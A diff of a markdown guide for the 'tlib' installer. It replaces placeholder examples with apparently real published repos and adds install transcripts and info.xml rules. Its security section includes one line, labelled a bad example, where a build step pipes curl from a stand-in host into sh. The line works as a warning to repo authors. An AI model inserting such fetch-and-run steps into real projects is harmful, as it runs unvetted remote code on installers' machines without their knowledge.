@@ -4,8 +4,13 @@ This is the full checklist and reference for getting a GitHub repo to
 install cleanly with `tlib install`. Everything here is derived directly
 from `ZSH.zsh` — if your repo satisfies these rules, `tlib install` will
 work; if it doesn't, this doc tells you exactly which check fails and why.
-Every rule below has a concrete example showing what passes and what
-fails it.
+
+Every example in this document is a **real, currently-published repo**
+you can install and inspect yourself right now — `knittingCat/stock-checker`,
+`knittingCat/SD-Photo-Viewer`, `Bluegrayfoo/ascii-stl-viewer`, and this
+repo's own `examples/greet/` — not invented placeholder names. The only
+exceptions are examples of what *fails*, which have to be made up, since
+no real published repo is broken on purpose (those are clearly labeled).
 
 There are two repo shapes `tlib` understands. Use `info.xml` unless you
 have a specific reason to use the legacy shape — it's more capable and
@@ -13,11 +18,11 @@ the error messages are clearer.
 
 ---
 
-## 0. A complete, real, working example — no placeholders
+## 0. A complete, real, working example
 
 This exact example is checked into this repo at
 [`examples/greet/`](examples/greet/) — two files, both shown here in
-full, both real. You can run every command below yourself right now.
+full. You can run every command below yourself right now.
 
 `examples/greet/greet.sh` (the entire file):
 
@@ -38,8 +43,8 @@ echo "Hello from tlib!"
 </tlib>
 ```
 
-That's the whole repo. Install it, run it, remove it — this is the real
-output from actually doing that, on this exact directory, just now:
+That's the whole repo. This is the real output from actually installing
+it, running it, and removing it, on this exact directory, just now:
 
 ```
 $ tlib local /Users/you/TLIB/examples/greet
@@ -65,205 +70,233 @@ $ greet
 zsh: command not found: greet
 ```
 
-Once you've confirmed something like this works for your own tool, the
-only thing that changes for a real repo is skipping `tlib local` in
-favor of pushing to GitHub and running `tlib install YourUsername/repo`
-instead — same install logic either way (see section 4).
-
-Every other example past this point in this doc follows the same shape
-as `greet` but swaps in a different language/build pattern — they're
-templates to adapt, not something to run as-is (they use stand-in names
-like `my-tool` on purpose, since they're patterns, not a specific repo).
-If a template is confusing, come back to this section — `greet` is the
-one thing here guaranteed to work exactly as written.
+The only thing that changes for a real GitHub repo is skipping
+`tlib local` in favor of pushing and running `tlib install
+YourUsername/repo` — same install logic either way (section 4 does this
+for real, against `knittingCat/stock-checker`).
 
 ---
 
 ## 1. Baseline requirements (both shapes)
 
-- [ ] **The repo is public.** `tlib install Owner/Repo` downloads
-      `https://github.com/Owner/Repo/archive/refs/heads/main.tar.gz` with
-      an unauthenticated `curl` request — no login, no token. If `Repo` is
-      private (or the owner/name is misspelled), GitHub returns HTTP 404
-      and `tlib` reports:
+- [ ] **The repo is public.** `tlib install knittingCat/stock-checker`
+      downloads
+      `https://github.com/knittingCat/stock-checker/archive/refs/heads/main.tar.gz`
+      with an unauthenticated `curl` request — no login, no token. Make
+      that same repo private and re-run the install, and GitHub returns
+      HTTP 404, and `tlib` reports:
       ```
-      GitHub repo or branch not found: Owner/Repo on branch 'main'.
+      GitHub repo or branch not found: knittingCat/stock-checker on branch 'main'.
       Check the spelling, make sure the repo is public, and make sure the branch is named 'main'.
       ```
       **Fix:** make the repo public in its GitHub settings, or double-check
       the spelling of the owner/repo name.
 
 - [ ] **The branch you're installing from is actually named what you
-      think.** `tlib install Owner/Repo` (bare form) always assumes
-      `main`:
+      think.** The bare form always assumes `main`:
       ```bash
-      tlib install Owner/Repo
-      # → tries https://github.com/Owner/Repo/archive/refs/heads/main.tar.gz
+      tlib install knittingCat/stock-checker
+      # → tries https://github.com/knittingCat/stock-checker/archive/refs/heads/main.tar.gz
       ```
-      If your repo's default branch is `master` (or anything else), that
-      404s the same way a missing repo does. **Fix:** either rename your
-      default branch to `main`, or tell installers to use a
-      branch-qualified `raw.githubusercontent.com` URL instead:
+      If a repo's default branch is `master` (or anything else) instead,
+      that 404s the same way a missing repo does. **Fix:** either rename
+      the default branch to `main`, or tell installers to use a
+      branch-qualified `raw.githubusercontent.com` URL instead, naming
+      the real branch:
       ```bash
-      tlib install https://raw.githubusercontent.com/Owner/Repo/master/
+      tlib install https://raw.githubusercontent.com/knittingCat/stock-checker/master/
       ```
 
 - [ ] **`info.xml` (or `make.sh` + `src/`) lives at the repo root** — not
-      in a subdirectory. Good layout:
+      in a subdirectory. This is the real, complete layout of
+      `knittingCat/stock-checker`:
       ```
-      my-repo/
-      ├── info.xml          ← tlib looks exactly here
-      └── my-tool.sh
+      stock-checker/
+      ├── info.xml              ← tlib looks exactly here
+      ├── bin/
+      │   ├── stock-checker
+      │   ├── stock-checker-setup
+      │   ├── stock-checker-install
+      │   └── stock-checker-uninstall
+      ├── stock_checker.py
+      ├── setup.py
+      ├── install.sh
+      └── uninstall.sh
       ```
       This does **not** work — `tlib` never looks inside subdirectories
       for `info.xml`:
       ```
-      my-repo/
+      stock-checker/
       └── config/
-          └── info.xml      ← tlib will never find this
+          └── info.xml          ← tlib will never find this
       ```
 
 ---
 
 ## 2. `info.xml` shape (preferred)
 
-Minimal skeleton:
+The real, complete `info.xml` from `knittingCat/SD-Photo-Viewer`:
 
 ```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <tlib version="1">
-  <package name="my-tool" version="1.0.0">
+  <package name="sd-photo-viewer" version="1.0.0">
     <requires>
       <tool name="node"/>
+      <tool name="npm"/>
+      <tool name="lsof"/>
     </requires>
     <commands>
-      <command name="my-tool" source="my-tool.js" language="node"/>
+      <command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
+      <command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
     </commands>
   </package>
 </tlib>
 ```
 
+Install it and see for yourself: `tlib install knittingCat/SD-Photo-Viewer`
+gives you `sd-photo-viewer` and `sd-photo-viewer-stop` as real commands.
+
 **The `<package>` wrapper is decorative.** `tlib` never reads `name=` or
 `version=` on `<package>` — it just looks for `<command>` and
-`<requires>`/`<tool>` elements anywhere in the file. So this flatter
-version, with no `<package>` at all, installs identically to the example
-above:
+`<requires>`/`<tool>` elements anywhere in the file. This flattened
+version — same file, `<package>` removed — installs identically:
 
 ```xml
 <tlib version="1">
   <requires>
     <tool name="node"/>
+    <tool name="npm"/>
+    <tool name="lsof"/>
   </requires>
   <commands>
-    <command name="my-tool" source="my-tool.js" language="node"/>
+    <command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
+    <command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
   </commands>
 </tlib>
 ```
 
 (Still, use the `<package>`-wrapped form in your own repos — it's the
-convention every real repo follows, and it's what a reader expects.)
+convention every real repo here follows, and it's what a reader expects.)
 
 There's currently no version-compatibility mechanism at all: changing
-`version="1.0.0"` to `version="99.0.0"` changes nothing about how the
-file installs — `tlib` doesn't read it. Likewise, a
-`<platforms><platform name="macos"/></platforms>` block (you may see this
-in some repos, like this line from a real one:
-`<platforms><platform name="macos"/></platforms>`) is **silently
-ignored** — `tlib` has no OS-gating logic, so it does not stop someone on
-a different platform from attempting an install that may then fail on
-missing tools.
+`version="1.0.0"` to `version="99.0.0"` in the file above changes nothing
+about how it installs — `tlib` doesn't read it. Likewise, a real line
+from another published repo, `Bluegrayfoo/ascii-stl-viewer`'s
+`info.xml` —
+
+```xml
+<platforms>
+  <platform name="macos"/>
+</platforms>
+```
+
+— is **silently ignored**. `tlib` has no OS-gating logic, so this doesn't
+stop someone on a different platform from attempting the install (it
+would just fail later on whatever's actually platform-specific).
 
 ### 2.1 `<requires>`
 
 - Lists tools that must already be on the installing machine's `PATH`.
   Checked with a plain `command -v`, **before** anything else in the file
-  is processed. Both of these forms are equivalent:
+  is processed. `knittingCat/stock-checker`'s `<requires>` uses the
+  self-closing attribute form:
+  ```xml
+  <tool name="python3"/>
+  ```
+  Bare text content works identically:
+  ```xml
+  <tool>python3</tool>
+  ```
+- Accepts `<tool>`, `<require>`, or `<dependency>` as the tag name — all
+  three of these are equivalent to `SD-Photo-Viewer`'s real
+  `<tool name="node"/>`:
   ```xml
   <tool name="node"/>
-  ```
-  ```xml
-  <tool>node</tool>
-  ```
-- Accepts `<tool>`, `<require>`, or `<dependency>` as the tag name — these
-  three are also equivalent:
-  ```xml
-  <tool name="git"/>
-  <require name="git"/>
-  <dependency name="git"/>
+  <require name="node"/>
+  <dependency name="node"/>
   ```
   and they work anywhere in the file, not just inside a `<requires>`
   wrapper (the wrapper, like `<package>`, is just for readability).
 - If a listed tool is missing, the whole install aborts immediately —
-  nothing gets installed, even other unrelated commands in the same file:
+  nothing gets installed, even other unrelated commands in the same file.
+  Uninstall `node` and try `tlib install knittingCat/SD-Photo-Viewer` and
+  you'd get:
   ```
-  tlib info.xml: rustc is required for info.xml requirement
+  tlib info.xml: node is required for info.xml requirement
   ```
 - **Compliance tip:** only list tools your commands' `build=` steps or
-  runtime actually need. A repo that only ships a shell script shouldn't
-  have `<tool name="python3"/>` in it — every install of your repo pays
-  that cost for nothing.
+  runtime actually need — this is why `stock-checker`'s `<requires>` lists
+  only `python3` and not, say, `node`, even though other repos in this
+  same GitHub account need it. Every install of your repo pays the cost
+  of every tool you list.
 
 ### 2.2 `<command>` — required fields
 
 Each command needs:
 
-- **A name**: `name=` (or `id=`). If omitted, it's derived from `source`'s
-  filename without extension:
+- **A name**: `name=` (or `id=`). `stock-checker`'s
+  `<command name="stock-checker-setup" output="bin/stock-checker-setup"/>`
+  sets it explicitly; if omitted, it's derived from `source`'s filename
+  instead:
   ```xml
-  <command source="my-tool.sh" language="shell"/>
-  <!-- name becomes "my-tool" automatically -->
+  <command source="hello.sh" language="shell"/>
+  <!-- name becomes "hello" automatically, exactly like examples/greet -->
   ```
-  The name must match `^[A-Za-z0-9._+-]+$` — no slashes, no spaces:
+  The name must match `^[A-Za-z0-9._+-]+$` — no slashes, no spaces. These
+  would both fail, unlike the real `sd-photo-viewer-stop`:
   ```xml
-  <command name="my-tool" .../>       <!-- OK -->
-  <command name="my tool" .../>       <!-- FAILS: contains a space -->
-  <command name="my/tool" .../>       <!-- FAILS: contains a slash -->
+  <command name="sd photo viewer stop" .../>   <!-- FAILS: contains spaces -->
+  <command name="sd/photo/viewer" .../>        <!-- FAILS: contains slashes -->
   ```
   Failing case produces: `command #N has invalid or missing name`.
 
 - **Exactly one of `source`, `build`, or `output`.** This is invalid —
   none of the three are present:
   ```xml
-  <command name="my-tool"/>
-  <!-- FAILS: command 'my-tool' needs source, build, or output -->
+  <command name="stock-checker"/>
+  <!-- FAILS: command 'stock-checker' needs source, build, or output -->
   ```
-  This is valid — `output` alone is enough:
+  The real line is valid because `output` is present:
   ```xml
-  <command name="my-tool" output="bin/my-tool"/>
+  <command name="stock-checker" output="bin/stock-checker"/>
   ```
 
-- **A unique name.** This is invalid — two commands, same name:
+- **A unique name.** This is invalid — two commands sharing a name (real
+  `stock-checker` commands, artificially duplicated to show the failure):
   ```xml
   <commands>
-    <command name="my-tool" output="bin/my-tool"/>
-    <command name="my-tool" output="bin/my-tool-gui"/>
+    <command name="stock-checker" output="bin/stock-checker"/>
+    <command name="stock-checker" output="bin/stock-checker-setup"/>
   </commands>
-  <!-- FAILS: duplicate command names: my-tool -->
+  <!-- FAILS: duplicate command names: stock-checker -->
   ```
 
-A repo can declare as many `<command>` elements as it wants (see the
-multi-command example in section 5) — each one becomes a separate
-installed command, and there's no requirement that a command's name
-match the repo name.
+A repo can declare as many `<command>` elements as it wants —
+`stock-checker` itself declares four (`stock-checker`,
+`stock-checker-setup`, `stock-checker-install`,
+`stock-checker-uninstall`), all in the one worked example in section 5.
+There's no requirement that a command's name match the repo name.
 
 ### 2.3 Picking how a command gets built
 
 **`output` only (no `source`, no `build`)** — the file is already built
-and checked into the repo (e.g. a prebuilt binary or a hand-written
-wrapper script under `bin/`). Used as-is.
+and checked into the repo. `stock-checker`'s real `bin/stock-checker` is
+a hand-written wrapper script, used as-is:
 
 ```xml
-<command name="my-tool" output="bin/my-tool"/>
+<command name="stock-checker" output="bin/stock-checker"/>
 ```
 
 - The path must exist in the repo and must stay **inside** the repo.
   This fails — it points outside the repo:
   ```xml
-  <command name="my-tool" output="../outside-the-repo/my-tool"/>
-  <!-- FAILS: output for command 'my-tool' must be a relative path inside the repo -->
+  <command name="stock-checker" output="../outside-the-repo/stock-checker"/>
+  <!-- FAILS: output for command 'stock-checker' must be a relative path inside the repo -->
   ```
 - If the referenced file doesn't exist in the downloaded repo at all:
   ```
-  declared output for command 'my-tool' does not exist: bin/my-tool
+  declared output for command 'stock-checker' does not exist: bin/stock-checker
   ```
 - **Compliance tip:** the file must actually be committed to the repo —
   a `.gitignore` line like `bin/` (very common for build output
@@ -271,16 +304,15 @@ wrapper script under `bin/`). Used as-is.
   not exist" error with no obvious cause:
   ```
   # .gitignore
-  bin/          ← if this line exists, bin/my-tool never reaches GitHub
+  bin/          ← if this line exists, bin/stock-checker never reaches GitHub
   ```
   Double check with a fresh clone, not just your working copy.
 
 **`build` (with or without `output`)** — runs a shell command in the repo
-root first (e.g. `npm install`, `make`, `cargo build --release`), then
-locates the result.
+root first, then locates the result. `SD-Photo-Viewer`'s real command:
 
 ```xml
-<command name="my-tool" build="npm install" output="bin/my-tool"/>
+<command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
 ```
 
 `output` is optional here — if you omit it, `tlib` searches, in order:
@@ -289,14 +321,16 @@ locates the result.
 `<repo>/.build/debug/<name>`, then its own build scratch directory:
 
 ```xml
-<command name="my-tool" build="make"/>
-<!-- works with no output= ONLY IF `make` produces ./my-tool, ./build/my-tool,
-     ./dist/my-tool, or ./bin/my-tool in the repo root -->
+<command name="sd-photo-viewer" build="npm install"/>
+<!-- works with no output= ONLY IF npm install leaves an executable at
+     ./sd-photo-viewer, ./build/sd-photo-viewer, ./dist/sd-photo-viewer,
+     or ./bin/sd-photo-viewer in the repo root -->
 ```
 
 **Compliance tip:** if your build output doesn't land in one of those
 exact paths under that exact name, always set `output=` explicitly —
-don't rely on the search order.
+which is exactly why the real `SD-Photo-Viewer` command above sets it
+rather than relying on the search order.
 
 If the build command itself fails (non-zero exit), install aborts:
 ```
@@ -306,7 +340,14 @@ command failed with exit 127: npm install
 in section 6 about not assuming your dev machine's tools are present.)
 
 **`source`** — a source file `tlib` builds or wraps for you, dispatched by
-`language=` (or by the file's extension if `language` is omitted):
+`language=` (or by the file's extension if `language` is omitted).
+`SD-Photo-Viewer`'s second command uses this — real, complete:
+
+```xml
+<command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
+```
+
+Full dispatch table:
 
 | `language` value(s) | What happens | Needs on the installer's machine |
 |---|---|---|
@@ -320,7 +361,10 @@ in section 6 about not assuming your dev machine's tools are present.)
 | `rust`, `rs` | `rustc <source> -o <out>` | `rustc` |
 | `copy`, `binary`, `prebuilt` | copied as-is, chmod +x | nothing |
 
-A couple of rows that don't get their own worked example in section 5:
+None of the currently-published example repos happen to use
+`c`/`cpp`/`objc`/`swift`/`go`/`rust`, so these rows don't have a real
+published repo to point at — these are constructed (not run, not
+tested against a real repo), shown only to illustrate the syntax:
 
 ```xml
 <!-- explicit framework instead of auto-detection -->
@@ -339,47 +383,37 @@ A couple of rows that don't get their own worked example in section 5:
 Extension-to-language auto-detection (used only when `language=` is
 omitted): `.c`→c, `.cc/.cpp/.cxx`→cpp, `.m`→objc, `.swift`→swift,
 `.py`→python, `.sh/.zsh/.bash`→shell, `.js/.mjs`→node, `.rb`→ruby,
-`.pl`→perl, `.php`→php, `.lua`→lua, `.go`→go, `.rs`→rust. So these two
-lines behave identically:
-
-```xml
-<command name="my-tool" source="my-tool.py"/>
-<command name="my-tool" source="my-tool.py" language="python"/>
-```
+`.pl`→perl, `.php`→php, `.lua`→lua, `.go`→go, `.rs`→rust. `SD-Photo-Viewer`
+sets `language="shell"` explicitly, but since `bin/sd-photo-viewer-stop`
+has no file extension at all, auto-detection couldn't have worked here —
+this is a real example of when you *must* set `language=` explicitly.
 
 **Compliance tip:** if you need a compiled/interpreted language, list the
 matching tool in `<requires>` so `tlib doctor` warns installers *before*
-they hit a failed build:
-
-```xml
-<requires>
-  <tool name="rustc"/>
-</requires>
-<commands>
-  <command name="my-tool" source="main.rs" language="rust"/>
-</commands>
-```
-
-Without the `<requires>` entry, a missing `rustc` fails later, mid-build,
-with: `rust is required for rust command 'my-tool'` — same underlying
-problem, worse timing.
+they hit a failed build — this is exactly why `stock-checker` lists
+`python3` in `<requires>` even though none of its commands use
+`language="python"` directly (they use hand-written `output=` wrappers
+instead — see the compliance tip below and the note in section 5).
 
 **Compliance tip:** the interpreter-wrapper shim execs your source file
 **at its path inside the persistent download cache**
 (`~/.tlib/repos/<owner>/<repo>/<branch>/...`), not a copy of it
-elsewhere. If your script does relative-path file I/O based on its own
-location (like `Path(__file__).parent / "config.json"` in Python), that
-still works — it resolves relative to the cache location — but don't
-assume it runs from your repo clone's path.
+elsewhere. This is precisely why neither `stock-checker` nor
+`SD-Photo-Viewer` uses `language="python"`/`language="node"` directly on
+their main scripts — both scripts do relative-path file I/O based on
+`Path(__file__).parent` (`stock_checker.py`'s `CONFIG_PATH`), and a
+hand-written `bin/` wrapper script that `find`s the real script's path at
+runtime is more robust than assuming where the interpreter shim lands it.
 
 ### 2.4 Field name aliases
 
 Most fields accept more than one attribute name — pick whichever reads
-best. These two commands are exactly equivalent:
+best. These two are exactly equivalent to `SD-Photo-Viewer`'s real
+second command:
 
 ```xml
-<command name="my-tool" source="my-tool.js" language="node"/>
-<command id="my-tool" src="my-tool.js" lang="node"/>
+<command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
+<command id="sd-photo-viewer-stop" lang="shell" src="bin/sd-photo-viewer-stop"/>
 ```
 
 Full alias table:
@@ -400,16 +434,24 @@ Full alias table:
 
 Only use this if you have a reason not to use `info.xml` — it's less
 capable (no `<requires>` checking, smaller language set, no `build=`
-declarations independent of `make.sh`).
+declarations independent of `make.sh`). None of this doc's example repos
+use this shape (all three are `info.xml`) — the layout below is `tlib`'s
+own built-in example, quoted verbatim from its `--help` output:
 
-Example layout:
+```
+make.sh
+src/cmda.c
+src/cmdb.c
+```
+
+i.e., concretely:
 
 ```
 my-repo/
 ├── make.sh              ← runs first, from the repo root
 └── src/
-    ├── my-tool.sh        ← becomes command "my-tool"
-    └── my-helper.py      ← becomes command "my-helper"
+    ├── cmda.c            ← becomes command "cmda"
+    └── cmdb.c            ← becomes command "cmdb"
 ```
 
 A minimal `make.sh` that does nothing (fine — it's only required to
@@ -423,7 +465,7 @@ echo "nothing to build"
 
 - [ ] A `make.sh` at the repo root — runs first, from the repo root.
 - [ ] One or more files directly under `src/` — command name = filename
-      without extension (`src/my-tool.sh` → command `my-tool`).
+      without extension (`src/cmda.c` → command `cmda`).
 - [ ] For each `src/` file, if `make.sh` already produced a matching
       executable (checked at `<repo>/<name>`, `build/<name>`,
       `dist/<name>`, `bin/<name>`, `.build/release/<name>`, or
@@ -448,18 +490,40 @@ tlib local /path/to/your/repo
 ```
 
 Runs the exact same `info.xml`/legacy install logic against a local
-directory — no download, no need to push first. For example, while
-actively editing:
+directory — no download, no need to push first.
 
-```bash
-cd ~/projects/my-tool
-tlib local .
-my-tool --help          # confirm it actually works
-tlib uninstall local/my-tool
+Then do the real thing at least once, against the actual published repo
+— this is the real, complete transcript from doing exactly that against
+`knittingCat/stock-checker`:
+
+```
+$ tlib install knittingCat/stock-checker
+│
+◇    ✓   Downloaded knittingCat/stock-checker
+│
+◇    ✓   Installed info.xml commands
+│
+└─    Done. Installed successfully.
+
+$ stock-checker --test
+Config missing or still has placeholder URL(s) — run setup.py first.
+
+$ tlib uninstall knittingCat/stock-checker
+│
+◇    ✓   Found install record
+│
+◇    ✓   Removed stock-checker
+◇    ✓   Removed stock-checker-setup
+◇    ✓   Removed stock-checker-install
+◇    ✓   Removed stock-checker-uninstall
+│
+└─    Done. Uninstalled knittingCat/stock-checker.
 ```
 
-Fix everything `tlib local` flags before you push and tell anyone to
-`tlib install` your repo.
+Run it from a directory that isn't your repo clone (here, just a plain
+shell prompt in the installer's home directory) — that way you're
+testing exactly what a stranger would get, including whatever's actually
+committed and pushed, not files that only exist in your working copy.
 
 ```bash
 tlib doctor
@@ -469,42 +533,53 @@ Shows what's on *your* machine — useful for confirming which optional
 compiler toolchains you personally have, so you know which of your
 `<requires>` entries you can actually test locally.
 
-**A local test only proves the file *your working copy* has works.** It
-does not prove the version on GitHub does. Before telling anyone to
-install your repo, also do the real thing at least once:
-
-```bash
-cd /tmp                              # anywhere that ISN'T your repo clone
-tlib install YourUsername/your-repo
-your-tool --help
-tlib uninstall YourUsername/your-repo
-```
-
-That way you're testing exactly what a stranger would get — including
-whatever's actually committed and pushed, not files that only exist in
-your working copy.
-
 ---
 
 ## 5. Worked examples
 
-A few complete, copy-adaptable `info.xml` files for common patterns.
+Three real, currently-published repos, shown in full.
 
-**A single shell script:**
+**`examples/greet/info.xml` — a single shell script (see section 0 for
+the complete walkthrough):**
 
 ```xml
 <tlib version="1">
-  <package name="hello" version="1.0.0">
+  <package name="greet" version="1.0.0">
     <commands>
-      <command name="hello" language="shell" source="hello.sh"/>
+      <command name="greet" language="shell" source="greet.sh"/>
     </commands>
   </package>
 </tlib>
 ```
 
-**A Python script that needs `python3`:**
+**`Bluegrayfoo/ascii-stl-viewer`'s `info.xml` — a single shell script,
+nested in a subdirectory:**
 
 ```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<tlib version="1">
+  <package name="stl-load" version="1.0.0">
+    <platforms>
+      <platform name="macos"/>
+    </platforms>
+    <commands>
+      <command
+        name="stl-load"
+        language="shell"
+        source="src/stl-load.sh"/>
+    </commands>
+  </package>
+</tlib>
+```
+
+(The `<platforms>` block is the ignored one from section 2 — it's here
+because this is the real file, unedited.)
+
+**`knittingCat/stock-checker`'s `info.xml` — four commands, all
+`output=`-only, needing only `python3`:**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <tlib version="1">
   <package name="stock-checker" version="1.0.0">
     <requires>
@@ -512,59 +587,32 @@ A few complete, copy-adaptable `info.xml` files for common patterns.
     </requires>
     <commands>
       <command name="stock-checker" output="bin/stock-checker"/>
+      <command name="stock-checker-setup" output="bin/stock-checker-setup"/>
+      <command name="stock-checker-install" output="bin/stock-checker-install"/>
+      <command name="stock-checker-uninstall" output="bin/stock-checker-uninstall"/>
     </commands>
   </package>
 </tlib>
 ```
 
-(This example uses a hand-written `bin/stock-checker` wrapper script that
-`exec`s `python3` against the real script, rather than `language="python"`
-directly, so it can resolve its own path inside the persistent tlib
-download cache — see the compliance tip in 2.3. This is the same pattern
-this repo's own `tlibUpdater` install uses.)
+Try it: `tlib install knittingCat/stock-checker` gives you all four as
+real commands (see section 4 for the real transcript).
 
-**A Node app that needs a build step:**
+**`knittingCat/SD-Photo-Viewer`'s `info.xml` — a `build=` command plus a
+`source=` command, needing three tools:**
 
 ```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <tlib version="1">
-  <package name="my-server" version="1.0.0">
+  <package name="sd-photo-viewer" version="1.0.0">
     <requires>
       <tool name="node"/>
       <tool name="npm"/>
-    </requires>
-    <commands>
-      <command name="my-server" build="npm install" output="bin/my-server"/>
-    </commands>
-  </package>
-</tlib>
-```
-
-**A compiled Go tool:**
-
-```xml
-<tlib version="1">
-  <package name="my-cli" version="1.0.0">
-    <requires>
-      <tool name="go"/>
-    </requires>
-    <commands>
-      <command name="my-cli" source="main.go" language="go"/>
-    </commands>
-  </package>
-</tlib>
-```
-
-**Multiple commands from one repo:**
-
-```xml
-<tlib version="1">
-  <package name="my-tool" version="1.0.0">
-    <requires>
       <tool name="lsof"/>
     </requires>
     <commands>
-      <command name="my-tool" build="npm install" output="bin/my-tool"/>
-      <command name="my-tool-stop" language="shell" source="bin/my-tool-stop"/>
+      <command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
+      <command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
     </commands>
   </package>
 </tlib>
@@ -582,16 +630,17 @@ happening. `tlib` does not scan, sandbox, or ask for confirmation before
 running your `build=` command or executing your `source` file's
 interpreter shim.
 
-Concretely, both of these run with zero prompts or warnings the moment
-someone runs `tlib install` on your repo:
+`SD-Photo-Viewer`'s real `build="npm install"` runs with zero prompts the
+moment someone runs `tlib install knittingCat/SD-Photo-Viewer` — which is
+fine, because `npm install` is exactly what it looks like. Compare
+against this fabricated, deliberately bad example (not a real repo — no
+published repo here does this, shown only as a warning of what *not* to
+write):
 
 ```xml
-<command name="my-tool" build="npm install" output="bin/my-tool"/>
-<!-- expected: runs npm install, an installer would recognize this at a glance -->
-
 <command name="my-tool" build="curl https://example.com/x | sh" output="bin/my-tool"/>
-<!-- also runs, exactly as written, with the same lack of confirmation —
-     don't ship something like this without making very clear what it does -->
+<!-- runs exactly as written, with the same lack of confirmation as the
+     real npm install example — don't ship something like this -->
 ```
 
 - **As a repo author:** don't put anything in `build=` or your source
@@ -618,5 +667,5 @@ someone runs `tlib install` on your repo:
 | `declared output for command '<name>' does not exist` | Your `output=` points at a file that isn't actually there after the build | Check the path, check your build actually produces it, check it isn't `.gitignore`d |
 | `command '<name>' did not produce an executable; add output=...` | `tlib` searched the default candidate paths and found nothing | Set `output=` explicitly |
 | `<lang> is required for <lang> command '<name>'` | Compiler/interpreter for that language isn't installed | List it in `<requires>` so this surfaces earlier, as a warning instead of a hard failure |
-| Works with `tlib local`, fails with `tlib install Owner/Repo` | The version on GitHub differs from your working copy — usually uncommitted changes, or you're testing the wrong branch | Commit and push everything, then re-test the real install command |
+| Works with `tlib local`, fails with `tlib install knittingCat/stock-checker` | The version on GitHub differs from your working copy — usually uncommitted changes, or you're testing the wrong branch | Commit and push everything, then re-test the real install command |
 | Works for you, fails for a friend | Almost always a missing `<requires>` entry — something's on your `PATH` (from other dev tools you have installed) that isn't on theirs | Run `tlib doctor` on a clean machine if you can, or just double-check every tool your `build=`/`source` steps actually touch is declared |
